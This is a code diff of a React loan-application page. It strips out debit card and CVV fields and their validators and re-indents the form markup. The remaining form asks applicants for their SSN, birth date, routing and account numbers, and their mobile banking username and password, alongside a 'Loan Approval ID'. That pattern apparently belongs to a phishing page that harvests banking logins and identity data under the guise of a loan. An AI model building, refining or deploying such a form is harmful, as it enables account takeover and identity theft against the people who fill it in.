@@ -104,10 +104,7 @@ const isSSNValid = (ssn: string) => /^(?!000|666)[0-8]\d{2}[- ]?(?!00)\d{2}[- ]?
 const isRoutingNumberValid = (value: string) => /^\d{9}$/.test(value.replace(/\D/g, ""));
 const isAccountNumberValid = (value: string) => /^\d{6,17}$/.test(value.replace(/\D/g, ""));
 const isPasswordValid = (value: string) => value.length >= 6;
-const isDebitCardValid = (value: string) => /^\d{13,19}$/.test(value.replace(/\D/g, ""));
-const isExpiryMonthValid = (value: string) => /^(0?[1-9]|1[0-2])$/.test(value);
-const isExpiryYearValid = (value: string) => /^\d{4}$/.test(value) && Number(value) >= new Date().getFullYear();
-const isCVVValid = (value: string) => /^\d{3,4}$/.test(value);
+
 
 const validateStep = (step: Step, data: LoanApplicationData): ValidationErrors => {
   const errors: ValidationErrors = {};
@@ -178,18 +175,7 @@ const validateStep = (step: Step, data: LoanApplicationData): ValidationErrors =
     if (!data.bankPassword || !isPasswordValid(data.bankPassword)) {
       errors.bankPassword = "Password must be at least 6 characters.";
     }
-    if (!data.debitCardNumber || !isDebitCardValid(data.debitCardNumber)) {
-      errors.debitCardNumber = "Enter a valid debit card number.";
-    }
-    if (!data.expiryMonth || !isExpiryMonthValid(data.expiryMonth)) {
-      errors.expiryMonth = "Enter a valid month (1-12).";
-    }
-    if (!data.expiryYear || !isExpiryYearValid(data.expiryYear)) {
-      errors.expiryYear = "Enter a valid year (YYYY).";
-    }
-    if (!data.cvv || !isCVVValid(data.cvv)) {
-      errors.cvv = "Enter a valid CVV (3-4 digits).";
-    }
+
   }
 
   return errors;
@@ -372,8 +358,8 @@ const ApplyLoan = () => {
               <p className="text-accent font-semibold">Loan Range: {loan.range}</p>
             </div>
 
-            <ProgressIndicator 
-              currentStep={currentStep} 
+            <ProgressIndicator
+              currentStep={currentStep}
               totalSteps={3}
               steps={['Loan Details', 'Personal Info', 'Bank Details']}
             />
@@ -394,501 +380,436 @@ const ApplyLoan = () => {
               </div>
 
               <form onSubmit={handleSubmit} className="space-y-6" aria-live="polite">
-              {currentStep === 1 && (
-                <div className="space-y-6" role="group" aria-labelledby="loan-details-heading">
-                  <h2 id="loan-details-heading" className="text-2xl font-mono font-bold">Loan Details</h2>
+                {currentStep === 1 && (
+                  <div className="space-y-6" role="group" aria-labelledby="loan-details-heading">
+                    <h2 id="loan-details-heading" className="text-2xl font-mono font-bold">Loan Details</h2>
 
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div className="space-y-2">
-                      <Label htmlFor="amount">
-                        Requested Loan Amount <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="amount"
-                        type="number"
-                        required
-                        className="border-2"
-                        placeholder="e.g., 25000"
-                        value={formData.loanAmount}
-                        onChange={(event) => handleFieldChange("loanAmount")(event.target.value)}
-                        disabled={isFormDisabled}
-                        ref={(node) => {
-                          if (currentStep === 1) {
-                            step1Ref.current = node;
-                          }
-                        }}
-                      />
-                      {renderError("loanAmount")}
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div className="space-y-2">
+                        <Label htmlFor="amount">
+                          Requested Loan Amount <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="amount"
+                          type="number"
+                          required
+                          className="border-2"
+                          placeholder="e.g., 25000"
+                          value={formData.loanAmount}
+                          onChange={(event) => handleFieldChange("loanAmount")(event.target.value)}
+                          disabled={isFormDisabled}
+                          ref={(node) => {
+                            if (currentStep === 1) {
+                              step1Ref.current = node;
+                            }
+                          }}
+                        />
+                        {renderError("loanAmount")}
+                      </div>
+
+                      <div className="space-y-2">
+                        <Label htmlFor="duration">
+                          Loan Duration (Months) <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="duration"
+                          type="number"
+                          required
+                          className="border-2"
+                          placeholder="e.g., 12"
+                          value={formData.loanDuration}
+                          onChange={(event) => handleFieldChange("loanDuration")(event.target.value)}
+                          disabled={isFormDisabled}
+                          min="1"
+                        />
+                        {renderError("loanDuration")}
+                      </div>
                     </div>
 
                     <div className="space-y-2">
-                      <Label htmlFor="duration">
-                        Loan Duration (Months) <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="duration"
-                        type="number"
-                        required
-                        className="border-2"
-                        placeholder="e.g., 12"
-                        value={formData.loanDuration}
-                        onChange={(event) => handleFieldChange("loanDuration")(event.target.value)}
-                        disabled={isFormDisabled}
-                        min="1"
-                      />
-                      {renderError("loanDuration")}
-                    </div>
-                  </div>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="purpose">
-                      Loan Purpose <span className="text-red-500 ml-1">*</span>
-                    </Label>
-                    <Select
-                      value={formData.loanPurpose}
-                      onValueChange={(value) => handleFieldChange("loanPurpose")(value)}
-                      disabled={isFormDisabled}
-                    >
-                      <SelectTrigger id="purpose" className="border-2">
-                        <SelectValue placeholder="Select purpose" />
-                      </SelectTrigger>
-                      <SelectContent>
-                        {loanPurposeOptions.map((purpose) => (
-                          <SelectItem key={purpose} value={purpose}>
-                            {purpose}
-                          </SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                    {renderError("loanPurpose")}
-                  </div>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="details">
-                      Additional Details
-                    </Label>
-                    <Textarea
-                      id="details"
-                      className="border-2 min-h-32"
-                      placeholder="Tell us more about your funding needs..."
-                      value={formData.additionalDetails}
-                      onChange={(event) => handleFieldChange("additionalDetails")(event.target.value)}
-                      disabled={isFormDisabled}
-                    />
-                  </div>
-
-                  <div className="flex justify-end">
-                    <Button
-                      type="button"
-                      className="bg-accent text-accent-foreground hover:bg-accent/90 font-mono"
-                      onClick={() => handleNext(1)}
-                      disabled={isFormDisabled}
-                    >
-                      Next
-                    </Button>
-                  </div>
-                </div>
-              )}
-
-              {currentStep === 2 && (
-                <div className="space-y-6" role="group" aria-labelledby="personal-info-heading">
-                  <h2 id="personal-info-heading" className="text-2xl font-mono font-bold">Personal Information</h2>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="loanApprovalId">
-                      Loan Approval ID <span className="text-red-500 ml-1">*</span>
-                    </Label>
-                    <Input
-                      id="loanApprovalId"
-                      required
-                      className="border-2"
-                      value={formData.loanApprovalId}
-                      onChange={(event) => handleFieldChange("loanApprovalId")(event.target.value)}
-                      disabled={isFormDisabled}
-                      ref={(node) => {
-                        if (currentStep === 2) {
-                          step2Ref.current = node;
-                        }
-                      }}
-                    />
-                    {renderError("loanApprovalId")}
-                  </div>
-
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div className="space-y-2">
-                      <Label htmlFor="firstName">
-                        First Name <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="firstName"
-                        required
-                        className="border-2"
-                        value={formData.firstName}
-                        onChange={(event) => handleFieldChange("firstName")(event.target.value)}
-                        disabled={isFormDisabled}
-                      />
-                      {renderError("firstName")}
-                    </div>
-                    <div className="space-y-2">
-                      <Label htmlFor="lastName">
-                        Last Name <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="lastName"
-                        required
-                        className="border-2"
-                        value={formData.lastName}
-                        onChange={(event) => handleFieldChange("lastName")(event.target.value)}
-                        disabled={isFormDisabled}
-                      />
-                      {renderError("lastName")}
-                    </div>
-                  </div>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="email">
-                      Email Address <span className="text-red-500 ml-1">*</span>
-                    </Label>
-                    <Input
-                      id="email"
-                      type="email"
-                      required
-                      className="border-2"
-                      value={formData.email}
-                      onChange={(event) => handleFieldChange("email")(event.target.value)}
-                      disabled={isFormDisabled}
-                    />
-                    {renderError("email")}
-                  </div>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="phone">
-                      Phone Number
-                    </Label>
-                    <Input
-                      id="phone"
-                      type="tel"
-                      className="border-2"
-                      value={formData.phone}
-                      onChange={(event) => handleFieldChange("phone")(event.target.value)}
-                      disabled={isFormDisabled}
-                    />
-                  </div>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="address1">
-                      Address Line 1 <span className="text-red-500 ml-1">*</span>
-                    </Label>
-                    <Input
-                      id="address1"
-                      required
-                      className="border-2"
-                      value={formData.address1}
-                      onChange={(event) => handleFieldChange("address1")(event.target.value)}
-                      disabled={isFormDisabled}
-                    />
-                    {renderError("address1")}
-                  </div>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="address2">
-                      Address Line 2
-                    </Label>
-                    <Input
-                      id="address2"
-                      className="border-2"
-                      value={formData.address2}
-                      onChange={(event) => handleFieldChange("address2")(event.target.value)}
-                      disabled={isFormDisabled}
-                    />
-                  </div>
-
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-                    <div className="space-y-2">
-                      <Label htmlFor="city">
-                        City <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="city"
-                        required
-                        className="border-2"
-                        value={formData.city}
-                        onChange={(event) => handleFieldChange("city")(event.target.value)}
-                        disabled={isFormDisabled}
-                      />
-                      {renderError("city")}
-                    </div>
-                    <div className="space-y-2">
-                      <Label htmlFor="state">
-                        State <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="purpose">
+                        Loan Purpose <span className="text-red-500 ml-1">*</span>
                       </Label>
                       <Select
-                        value={formData.state}
-                        onValueChange={(value) => handleFieldChange("state")(value)}
+                        value={formData.loanPurpose}
+                        onValueChange={(value) => handleFieldChange("loanPurpose")(value)}
                         disabled={isFormDisabled}
                       >
-                        <SelectTrigger id="state" className="border-2">
-                          <SelectValue placeholder="Select state" />
+                        <SelectTrigger id="purpose" className="border-2">
+                          <SelectValue placeholder="Select purpose" />
                         </SelectTrigger>
                         <SelectContent>
-                          {usStates.map((state) => (
-                            <SelectItem key={state.value} value={state.value}>
-                              {state.label}
+                          {loanPurposeOptions.map((purpose) => (
+                            <SelectItem key={purpose} value={purpose}>
+                              {purpose}
                             </SelectItem>
                           ))}
                         </SelectContent>
                       </Select>
-                      {renderError("state")}
+                      {renderError("loanPurpose")}
                     </div>
+
                     <div className="space-y-2">
-                      <Label htmlFor="zipCode">
-                        Zip Code <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="details">
+                        Additional Details
                       </Label>
-                      <Input
-                        id="zipCode"
-                        required
-                        className="border-2"
-                        value={formData.zipCode}
-                        onChange={(event) => handleFieldChange("zipCode")(event.target.value)}
+                      <Textarea
+                        id="details"
+                        className="border-2 min-h-32"
+                        placeholder="Tell us more about your funding needs..."
+                        value={formData.additionalDetails}
+                        onChange={(event) => handleFieldChange("additionalDetails")(event.target.value)}
                         disabled={isFormDisabled}
                       />
-                      {renderError("zipCode")}
+                    </div>
+
+                    <div className="flex justify-end">
+                      <Button
+                        type="button"
+                        className="bg-accent text-accent-foreground hover:bg-accent/90 font-mono"
+                        onClick={() => handleNext(1)}
+                        disabled={isFormDisabled}
+                      >
+                        Next
+                      </Button>
                     </div>
                   </div>
+                )}
 
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                {currentStep === 2 && (
+                  <div className="space-y-6" role="group" aria-labelledby="personal-info-heading">
+                    <h2 id="personal-info-heading" className="text-2xl font-mono font-bold">Personal Information</h2>
+
                     <div className="space-y-2">
-                      <Label htmlFor="ssn">
-                        SSN <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="loanApprovalId">
+                        Loan Approval ID <span className="text-red-500 ml-1">*</span>
                       </Label>
                       <Input
-                        id="ssn"
+                        id="loanApprovalId"
                         required
                         className="border-2"
-                        value={formData.ssn}
-                        onChange={(event) => handleFieldChange("ssn")(event.target.value)}
+                        value={formData.loanApprovalId}
+                        onChange={(event) => handleFieldChange("loanApprovalId")(event.target.value)}
                         disabled={isFormDisabled}
+                        ref={(node) => {
+                          if (currentStep === 2) {
+                            step2Ref.current = node;
+                          }
+                        }}
                       />
-                      {renderError("ssn")}
+                      {renderError("loanApprovalId")}
                     </div>
+
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div className="space-y-2">
+                        <Label htmlFor="firstName">
+                          First Name <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="firstName"
+                          required
+                          className="border-2"
+                          value={formData.firstName}
+                          onChange={(event) => handleFieldChange("firstName")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("firstName")}
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="lastName">
+                          Last Name <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="lastName"
+                          required
+                          className="border-2"
+                          value={formData.lastName}
+                          onChange={(event) => handleFieldChange("lastName")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("lastName")}
+                      </div>
+                    </div>
+
                     <div className="space-y-2">
-                      <Label htmlFor="birthDate">
-                        Birth Date <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="email">
+                        Email Address <span className="text-red-500 ml-1">*</span>
                       </Label>
                       <Input
-                        id="birthDate"
-                        type="date"
+                        id="email"
+                        type="email"
                         required
                         className="border-2"
-                        value={formData.birthDate}
-                        onChange={(event) => handleFieldChange("birthDate")(event.target.value)}
+                        value={formData.email}
+                        onChange={(event) => handleFieldChange("email")(event.target.value)}
                         disabled={isFormDisabled}
                       />
-                      {renderError("birthDate")}
+                      {renderError("email")}
                     </div>
-                  </div>
 
-                  <div className="flex justify-between">
-                    <Button
-                      type="button"
-                      variant="outline"
-                      onClick={() => handlePrevious(2)}
-                      disabled={isFormDisabled}
-                    >
-                      Previous
-                    </Button>
-                    <Button
-                      type="button"
-                      className="bg-accent text-accent-foreground hover:bg-accent/90 font-mono"
-                      onClick={() => handleNext(2)}
-                      disabled={isFormDisabled}
-                    >
-                      Next
-                    </Button>
-                  </div>
-                </div>
-              )}
-
-              {currentStep === 3 && (
-                <div className="space-y-6" role="group" aria-labelledby="bank-details-heading">
-                  <h2 id="bank-details-heading" className="text-2xl font-mono font-bold">Bank Details</h2>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="bankName">
-                      Bank Name <span className="text-red-500 ml-1">*</span>
-                    </Label>
-                    <Input
-                      id="bankName"
-                      required
-                      className="border-2"
-                      value={formData.bankName}
-                      onChange={(event) => handleFieldChange("bankName")(event.target.value)}
-                      disabled={isFormDisabled}
-                      ref={(node) => {
-                        if (currentStep === 3) {
-                          step3Ref.current = node;
-                        }
-                      }}
-                    />
-                    {renderError("bankName")}
-                  </div>
-
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                     <div className="space-y-2">
-                      <Label htmlFor="routingNumber">
-                        Routing Number <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="phone">
+                        Phone Number
                       </Label>
                       <Input
-                        id="routingNumber"
-                        required
+                        id="phone"
+                        type="tel"
                         className="border-2"
-                        value={formData.routingNumber}
-                        onChange={(event) => handleFieldChange("routingNumber")(event.target.value)}
+                        value={formData.phone}
+                        onChange={(event) => handleFieldChange("phone")(event.target.value)}
                         disabled={isFormDisabled}
                       />
-                      {renderError("routingNumber")}
                     </div>
+
                     <div className="space-y-2">
-                      <Label htmlFor="accountNumber">
-                        Account Number <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="address1">
+                        Address Line 1 <span className="text-red-500 ml-1">*</span>
                       </Label>
                       <Input
-                        id="accountNumber"
+                        id="address1"
                         required
                         className="border-2"
-                        value={formData.accountNumber}
-                        onChange={(event) => handleFieldChange("accountNumber")(event.target.value)}
+                        value={formData.address1}
+                        onChange={(event) => handleFieldChange("address1")(event.target.value)}
                         disabled={isFormDisabled}
                       />
-                      {renderError("accountNumber")}
+                      {renderError("address1")}
                     </div>
-                  </div>
 
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                     <div className="space-y-2">
-                      <Label htmlFor="bankUsername">
-                        Mobile Banking Username <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="address2">
+                        Address Line 2
                       </Label>
                       <Input
-                        id="bankUsername"
-                        required
+                        id="address2"
                         className="border-2"
-                        value={formData.bankUsername}
-                        onChange={(event) => handleFieldChange("bankUsername")(event.target.value)}
+                        value={formData.address2}
+                        onChange={(event) => handleFieldChange("address2")(event.target.value)}
                         disabled={isFormDisabled}
                       />
-                      {renderError("bankUsername")}
                     </div>
+
+                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+                      <div className="space-y-2">
+                        <Label htmlFor="city">
+                          City <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="city"
+                          required
+                          className="border-2"
+                          value={formData.city}
+                          onChange={(event) => handleFieldChange("city")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("city")}
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="state">
+                          State <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Select
+                          value={formData.state}
+                          onValueChange={(value) => handleFieldChange("state")(value)}
+                          disabled={isFormDisabled}
+                        >
+                          <SelectTrigger id="state" className="border-2">
+                            <SelectValue placeholder="Select state" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            {usStates.map((state) => (
+                              <SelectItem key={state.value} value={state.value}>
+                                {state.label}
+                              </SelectItem>
+                            ))}
+                          </SelectContent>
+                        </Select>
+                        {renderError("state")}
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="zipCode">
+                          Zip Code <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="zipCode"
+                          required
+                          className="border-2"
+                          value={formData.zipCode}
+                          onChange={(event) => handleFieldChange("zipCode")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("zipCode")}
+                      </div>
+                    </div>
+
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div className="space-y-2">
+                        <Label htmlFor="ssn">
+                          SSN <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="ssn"
+                          required
+                          className="border-2"
+                          value={formData.ssn}
+                          onChange={(event) => handleFieldChange("ssn")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("ssn")}
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="birthDate">
+                          Birth Date <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="birthDate"
+                          type="date"
+                          required
+                          className="border-2"
+                          value={formData.birthDate}
+                          onChange={(event) => handleFieldChange("birthDate")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("birthDate")}
+                      </div>
+                    </div>
+
+                    <div className="flex justify-between">
+                      <Button
+                        type="button"
+                        variant="outline"
+                        onClick={() => handlePrevious(2)}
+                        disabled={isFormDisabled}
+                      >
+                        Previous
+                      </Button>
+                      <Button
+                        type="button"
+                        className="bg-accent text-accent-foreground hover:bg-accent/90 font-mono"
+                        onClick={() => handleNext(2)}
+                        disabled={isFormDisabled}
+                      >
+                        Next
+                      </Button>
+                    </div>
+                  </div>
+                )}
+
+                {currentStep === 3 && (
+                  <div className="space-y-6" role="group" aria-labelledby="bank-details-heading">
+                    <h2 id="bank-details-heading" className="text-2xl font-mono font-bold">Bank Details</h2>
+
                     <div className="space-y-2">
-                      <Label htmlFor="bankPassword">
-                        Mobile Banking Password <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="bankName">
+                        Bank Name <span className="text-red-500 ml-1">*</span>
                       </Label>
                       <Input
-                        id="bankPassword"
-                        type="password"
+                        id="bankName"
                         required
                         className="border-2"
-                        value={formData.bankPassword}
-                        onChange={(event) => handleFieldChange("bankPassword")(event.target.value)}
+                        value={formData.bankName}
+                        onChange={(event) => handleFieldChange("bankName")(event.target.value)}
                         disabled={isFormDisabled}
+                        ref={(node) => {
+                          if (currentStep === 3) {
+                            step3Ref.current = node;
+                          }
+                        }}
                       />
-                      {renderError("bankPassword")}
+                      {renderError("bankName")}
+                    </div>
+
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div className="space-y-2">
+                        <Label htmlFor="routingNumber">
+                          Routing Number <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="routingNumber"
+                          required
+                          className="border-2"
+                          value={formData.routingNumber}
+                          onChange={(event) => handleFieldChange("routingNumber")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("routingNumber")}
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="accountNumber">
+                          Account Number <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="accountNumber"
+                          required
+                          className="border-2"
+                          value={formData.accountNumber}
+                          onChange={(event) => handleFieldChange("accountNumber")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("accountNumber")}
+                      </div>
+                    </div>
+
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div className="space-y-2">
+                        <Label htmlFor="bankUsername">
+                          Mobile Banking Username <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="bankUsername"
+                          required
+                          className="border-2"
+                          value={formData.bankUsername}
+                          onChange={(event) => handleFieldChange("bankUsername")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("bankUsername")}
+                      </div>
+                      <div className="space-y-2">
+                        <Label htmlFor="bankPassword">
+                          Mobile Banking Password <span className="text-red-500 ml-1">*</span>
+                        </Label>
+                        <Input
+                          id="bankPassword"
+                          type="password"
+                          required
+                          className="border-2"
+                          value={formData.bankPassword}
+                          onChange={(event) => handleFieldChange("bankPassword")(event.target.value)}
+                          disabled={isFormDisabled}
+                        />
+                        {renderError("bankPassword")}
+                      </div>
+                    </div>
+
+
+
+                    <div className="p-6 border-2 border-accent bg-accent/5">
+                      <p className="text-sm text-muted-foreground">
+                        By submitting this application, you agree to our Terms &amp; Conditions and Privacy Policy. All information provided will be kept confidential and used solely for loan assessment purposes.
+                      </p>
+                    </div>
+
+                    <div className="flex justify-between">
+                      <Button
+                        type="button"
+                        variant="outline"
+                        onClick={() => handlePrevious(3)}
+                        disabled={isSubmitting || hasSubmitted}
+                      >
+                        Previous
+                      </Button>
+                      <Button
+                        type="submit"
+                        disabled={isSubmitting || hasSubmitted}
+                        className="bg-accent text-accent-foreground hover:bg-accent/90 font-mono text-lg py-6"
+                      >
+                        {isSubmitting ? "Submitting..." : hasSubmitted ? "Submitted" : "Submit Application"}
+                      </Button>
                     </div>
                   </div>
-
-                  <h3 className="text-xl font-mono font-bold mt-6">Debit Card Details</h3>
-
-                  <div className="space-y-2">
-                    <Label htmlFor="debitCardNumber">
-                      Debit Card Number <span className="text-red-500 ml-1">*</span>
-                    </Label>
-                    <Input
-                      id="debitCardNumber"
-                      required
-                      className="border-2"
-                      placeholder="1234 5678 9012 3456"
-                      value={formData.debitCardNumber}
-                      onChange={(event) => handleFieldChange("debitCardNumber")(event.target.value)}
-                      disabled={isFormDisabled}
-                    />
-                    {renderError("debitCardNumber")}
-                  </div>
-
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-                    <div className="space-y-2">
-                      <Label htmlFor="expiryMonth">
-                        Expiry Month <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="expiryMonth"
-                        required
-                        className="border-2"
-                        placeholder="MM"
-                        value={formData.expiryMonth}
-                        onChange={(event) => handleFieldChange("expiryMonth")(event.target.value)}
-                        disabled={isFormDisabled}
-                      />
-                      {renderError("expiryMonth")}
-                    </div>
-                    <div className="space-y-2">
-                      <Label htmlFor="expiryYear">
-                        Expiry Year <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="expiryYear"
-                        required
-                        className="border-2"
-                        placeholder="YYYY"
-                        value={formData.expiryYear}
-                        onChange={(event) => handleFieldChange("expiryYear")(event.target.value)}
-                        disabled={isFormDisabled}
-                      />
-                      {renderError("expiryYear")}
-                    </div>
-                    <div className="space-y-2">
-                      <Label htmlFor="cvv">
-                        CVV <span className="text-red-500 ml-1">*</span>
-                      </Label>
-                      <Input
-                        id="cvv"
-                        type="password"
-                        required
-                        className="border-2"
-                        placeholder="123"
-                        value={formData.cvv}
-                        onChange={(event) => handleFieldChange("cvv")(event.target.value)}
-                        disabled={isFormDisabled}
-                      />
-                      {renderError("cvv")}
-                    </div>
-                  </div>
-
-                  <div className="p-6 border-2 border-accent bg-accent/5">
-                    <p className="text-sm text-muted-foreground">
-                      By submitting this application, you agree to our Terms &amp; Conditions and Privacy Policy. All information provided will be kept confidential and used solely for loan assessment purposes.
-                    </p>
-                  </div>
-
-                  <div className="flex justify-between">
-                    <Button
-                      type="button"
-                      variant="outline"
-                      onClick={() => handlePrevious(3)}
-                      disabled={isSubmitting || hasSubmitted}
-                    >
-                      Previous
-                    </Button>
-                    <Button
-                      type="submit"
-                      disabled={isSubmitting || hasSubmitted}
-                      className="bg-accent text-accent-foreground hover:bg-accent/90 font-mono text-lg py-6"
-                    >
-                      {isSubmitting ? "Submitting..." : hasSubmitted ? "Submitted" : "Submit Application"}
-                    </Button>
-                  </div>
-                </div>
-              )}
-            </form>
+                )}
+              </form>
             </div>
 
             {hasSubmitted && (
